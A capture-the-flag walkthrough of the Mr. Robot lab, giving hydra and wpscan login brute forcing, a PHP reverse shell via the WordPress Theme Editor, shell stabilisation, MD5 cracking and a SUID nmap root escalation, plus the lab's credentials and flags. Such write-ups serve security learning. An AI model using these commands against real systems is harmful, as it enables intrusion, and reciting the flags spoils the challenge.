# Mr. Robot CTF — Detailed Notes (English)

**By:** Obito Uchiha — Team AKATSUKI **Target:** `10.48.190.143`

---

## 1. What Is This Topic?

This is a **Linux web exploitation + privilege escalation** box. In simple terms: we're given a server running a website (WordPress). Our goal is to break into the website (initial access), become a normal shell user, then escalate to **root** (the most powerful user), collecting three flags (keys) along the way.

**Real-life analogy:** Think of this as a building. The front gate (website) has a weak guard, so you manage to steal the receptionist's badge (WordPress login), use it to reach an office (shell), find a cleaner's pass inside that office (robot user), and finally find a master maintenance key that opens the entire building (root).

---

## 2. Technologies / Tools Table

|Tool|Purpose|
|---|---|
|`nmap`|Discover open ports and running services|
|Directory brute forcing|Find hidden files/folders on the web server|
|`wpscan`|WordPress-specific vulnerability and user scanning|
|`hydra`|Brute-force attacks against login forms|
|WordPress Theme Editor|Directly edit PHP files to upload a shell|
|`netcat (nc)`|Catch the reverse shell connection|
|`python3 pty`|Stabilize/upgrade the shell to a full TTY|
|`john the ripper`|Crack password hashes|
|`rockyou.txt`|Wordlist of commonly leaked passwords|
|GTFOBins|Database documenting SUID/sudo binary exploitation|

---

## 3. Vulnerabilities Exploited

1. **Information Disclosure via robots.txt** — The server itself leaked sensitive filenames inside `robots.txt` (a wordlist and the first flag).
2. **No Rate Limiting on Login** — `/wp-login.php` allowed unlimited login attempts, making brute forcing possible.
3. **Weak/Guessable Password** — The admin's password was weak enough to be cracked from a wordlist.
4. **Arbitrary File Write → RCE (Theme Editor)** — WordPress's admin panel allows theme file editing. Once the attacker becomes admin, they can edit a `.php` file and inject malicious code (a reverse shell) directly onto the server — this is straightforward **Remote Code Execution**.
5. **Weak Hash / Weak Password (robot user)** — An MD5 hash was found that matched an entry in the rockyou wordlist.
6. **SUID Misconfiguration (nmap binary)** — The `nmap` binary had the SUID bit set. Older Nmap versions ship an interactive mode that can run shell commands — inheriting root's permissions.

---

## 4. Beginner to Challenge — Step by Step (Explained Like Teaching a Younger Sibling)

Let's assume you know nothing yet. Here's the full walkthrough, step by step:

### Step 0: Understand What We're Doing

Whenever you need to hack a machine, the first job is always to **see what's there**. It's like walking up to a stranger's house — first you check how many doors there are, and which ones are unlocked.

### Step 1: Nmap Scan — Finding the Doors

```
nmap -sV -p- 10.48.190.143
```

This revealed:

- Port 22 (SSH) — a "remote login" door, but it needs credentials
- Port 80/443 (HTTP/HTTPS) — the website door, usually the most "attackable" surface

**Analogy:** Like standing outside a building checking which door is open — SSH is a small locked door, HTTP is the big front gate.

### Step 2: Exploring the Website

Once we knew a website was running, we did **directory brute forcing** — trying thousands of common folder/file names (like `/admin`, `/backup`, `/robots.txt`) to see what's "hidden."

**Analogy:** Like checking every hidden spot outside a house — under the doormat, under a flowerpot — hoping to find a spare key.

We found `robots.txt`. This file normally tells search engines "don't index these pages" — but here the developer accidentally listed sensitive items:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

We viewed the file's content with `curl`:

```
curl http://10.48.190.143/robots.txt
```

And got the first flag: **Flag 1 = `073403c8a58a1f80d943455fb30724b9`**

We also found a wordlist, `fsocity.dic` — useful later for password guessing.

### Step 3: Discovering It's WordPress

WordPress is a very common CMS (Content Management System) used to build websites. Once we knew the site was WordPress, we used a specialized tool: `wpscan`.

```
wpscan --url 'http://10.48.190.143:80' -e u
```

This revealed:

1. **XML-RPC is enabled** — an old WordPress feature that can sometimes make brute-force attacks easier
2. **WordPress version 4.3.1** — an outdated 2015 version, likely containing known vulnerabilities
3. **Theme: twentyfifteen** — the active design theme (useful later)

**Analogy:** Just like noticing a company is running old, unpatched software and realizing their security is weaker — an old lock is easier to pick.

### Step 4: Attacking the Login Page

We noticed `/wp-login.php` had no rate limiting — meaning we could try as many passwords as we wanted without being blocked.

**Analogy:** Like an ATM that never locks your card no matter how many wrong PINs you enter — you can try thousands of PINs.

#### 4a: Find the Username First

```
hydra -L dictionary.txt -p admin 10.48.190.143 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.48.190.143%2Fwp-admin%2F&testcookie=1:F=Invalid username" -vV
```

Here we fixed a dummy password (`admin`) and tried a list of usernames, watching for the "Invalid username" error message to disappear — when it disappeared, that username was valid.

Found: **`Elliot`**

#### 4b: Now Find the Password

Hydra's password-cracking result on login forms can sometimes be a "false positive" (looks correct but isn't) — so we used WPScan's proper password-attack module instead, which is more reliable:

```
wpscan --url 'http://10.48.190.143:80' --usernames Elliot --passwords dictionary.txt
```

Found: **`ER28-0652`**

### Step 5: Logging In and Exploring the Admin Panel

With valid credentials (`Elliot : ER28-0652`), we logged into `/wp-admin`.

WordPress's admin panel has a section called **Appearance → Theme Editor**, where an admin can directly edit the theme's PHP files. This is a very powerful feature — but dangerous in the wrong hands, because PHP code = code execution on the server.

**Analogy:** Like getting the key to a building's maintenance room where you can control all the wiring — from there you can flip any switch you want.

### Step 6: Uploading a Reverse Shell (RCE)

We selected the `404.php` template (the page shown on "page not found") and replaced its entire content with the **pentestmonkey PHP reverse shell** — editing in our attacking machine's IP and port. We saved it.

We then started a listener on our machine:

```
nc -lvnp <PORT>
```

Then opened the 404 page in the browser (which executes our edited `404.php`):

```
http://10.48.190.143/wp-content/themes/twentyfifteen/404.php
```

As soon as this page loaded, our listener received a connection — meaning our code had executed on the server and we got a shell:

```
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

**This is Remote Code Execution (RCE)** — we were able to run code of our choice on the server.

### Step 7: "Upgrading" the Shell

The shell we get this way is very basic (no tab-completion, disconnects on Ctrl+C). So we convert it into a proper interactive bash shell:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then press `Ctrl+Z` (to background it), then:

```
stty raw -echo; fg
export TERM=xterm
```

This makes our shell behave like a normal terminal — colors, arrow keys, clear screen all work properly.

### Step 8: Privilege Escalation — daemon to robot

We're currently the `daemon` user — a low-privilege account. Inside `/home/robot` we found a hash file (MD5 format), which is the robot user's password hash.

**Analogy:** Like finding a locked diary whose code you don't know, but you have a huge dictionary listing thousands of possible codes — you try each one until something matches.

We cracked this hash with John the Ripper, against the rockyou wordlist (a list of the world's most common leaked passwords):

```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=raw-md5 hash.txt
```

Result:

```
robot:abcdefghijklmnopqrstuvwxyz
```

We then switch to the robot user:

```
$ whoami
robot
$ cat key-2-of-3.txt
```

**Flag 2 = `822c73956184f694993bede3eb39f959`**

### Step 9: Privilege Escalation — robot to root

We first tried `sudo`, but permission was denied:

```
Sorry, user robot may not run sudo on ip-10-48-190-143.
```

So we tried another common technique: **finding SUID binaries**. SUID means that when the program runs, it runs with the permissions of its OWNER, no matter who executes it. If a program is owned by root and has SUID set, whoever runs it can temporarily gain root-like power.

```
find / -perm -u=s -type f 2>/dev/null
```

This revealed: `/usr/local/bin/nmap` — unusual, since nmap having SUID is not standard practice.

**Analogy:** Like finding a security guard's uniform — wearing it lets you move through the building with a guard's level of access, even though you're not the real guard.

We checked GTFOBins (a site documenting how to exploit every SUID/sudo binary) — older Nmap versions have an **interactive mode** that can run system commands, and since nmap was running with root's permissions, that command also runs as root.

```
nmap --interactive
nmap> !sh
```

This drops us into a root shell:

```
# id
uid=0(root) ...
```

### Step 10: Final Flag

```
# cat /root/key-3-of-3.txt
```

**Flag 3 = `04787ddef27c3dee1ee161b21670b4e4`**

---

## 5. Summary Table

|Step|What We Did|
|---|---|
|Recon|Scanned ports with Nmap|
|Web enum|Found flag 1 + wordlist via robots.txt|
|Fingerprint|Identified WordPress 4.3.1 + theme via WPScan|
|Access|Enumerated username with Hydra, brute-forced password with WPScan|
|RCE|Injected a PHP reverse shell via the Theme Editor|
|Shell stabilize|python pty trick|
|Priv-esc 1|Cracked MD5 hash (John + rockyou) → robot → flag 2|
|Priv-esc 2|Exploited SUID nmap's interactive mode → root → flag 3|

**All three flags captured, root access achieved — room complete!**

---

_Notes by Obito Uchiha — Team AKATSUKI_